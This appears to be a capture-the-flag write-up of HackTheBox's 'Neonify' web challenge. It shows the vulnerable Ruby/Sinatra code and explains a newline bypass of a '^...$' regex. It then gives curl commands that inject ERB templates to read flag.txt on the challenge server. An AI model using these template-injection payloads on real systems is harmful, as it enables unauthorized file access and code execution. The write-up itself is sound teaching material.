---
title: "Neonify HTB CTF SSTI + Regex bypass"
date: 2022-06-21 17:01:00 +0200
categories: [CTF, SSTI]
tags: [ctf, xss, ssti, parsing, regex bypass]
author: 1
---

# Neonify CTF Writeup

Neonify CTF is one provided by HTB under the WEB portion of CTF Challenges. It's quite a simple, beginner friendly CTF.

## Manual Analysis

### Checking Available Subpages
Considering that vulnerability scanning tools were 0 help, I manually start checking the website.

After entering it for the first time, I realize that the index page is the only one accessible by the user, and there's user input so my brain instantly thinks XSS.

### Attempting XSS

After attempting a few basic testing scripts such as:

```js
<script>alert(1)</script>
```

We get a notification: "Malicious input detected".

### Conclusion

So now we know there's some type of a regex/parser that detects us.

The no.1 thing I learned when it comes to web is that 80% of challenges can be solved by going through the source code so that is what I did

## Source Code

So going through the source code I stumbled upon a file called "neon.rb".

```ruby
class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end
```

Looking through it we see there's some type of regex inside allowing only characters 0-9, a-z and spaces. Anything else will throw a "Malicious Input Detected".

So now we know we have to somehow bypass this regex, but how?

We also see in the files that theres a flag.txt file telling us that the flag is hidden under the /flag part of the page, sadly... it's not accessible by plainly putting it in the browser.

## Research

### Ruby Regex

So by the power of google, I found out that using "$" in a Ruby regex is not the smartest idea. This is because it can be bypassed by using a newline. Stack overflow was my friend here... [original post](https://stackoverflow.com/questions/577653/difference-between-a-z-and-in-ruby-regular-expressions).

### ERB

If we go back to the source code, we see a function ERB.new() getting called if the regex conditions are met, so I have to check what this is, in order to know what to do after bypassing the regex.

I found this post, so feel free to refer to it [here](https://ruby-doc.org/stdlib-2.7.1/libdoc/erb/rdoc/ERB.html)

This post helped me understand basically what ERB is, it's a templating system, allowing Ruby code to be added to a document for generating flow controls, document info. etc.

On the same post I found these ruby rules:

```
<% Ruby code -- inline with output %>
<%= Ruby expression -- replace with result %>
<%# comment -- ignored -- useful in testing %>
% a line of Ruby code -- treated as <% line %> (optional -- see ERB.new)
%% replaced with % if first thing on a line and % processing is used
<%% or %%> -- replace with <% or %> respectively
```



## Exploitation

For all requests sent, I used curl, it was simpler for me, but Burp can be used as well. In this case it's personal preference.

```bash
curl -d 'payload'
```

### Attempt 1

After googling for some time I found a function for ruby called File.open('flag.txt'), but putting in a payload in did not work.

```bash
curl -d 'neon=lmao
%3C%25%3DFile.open%28%22flag.txt%29%25%3E' 178.62.40.59:32062
```

### Attempt 2

After a bit more of googling I found that if I want ruby to return my output I have to use the .read function

```bash
curl -d 'neon=lmao
%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' 157.245.33.77:30719
```

And so... boom we have the flag!

**flag:** HTB{f4k3_fl4g_f0r_t3st1ng}

Yes, you will have to run it on your own, I will not make it too easy.

## Closing Statement

This was quite an interesting challenge, especially due to me not being too experienced with Ruby or anything connected to it. Yes, I had quite a trouble googling on how to exploit this but it paid off at the end.

Thank you for reading my writeup.






























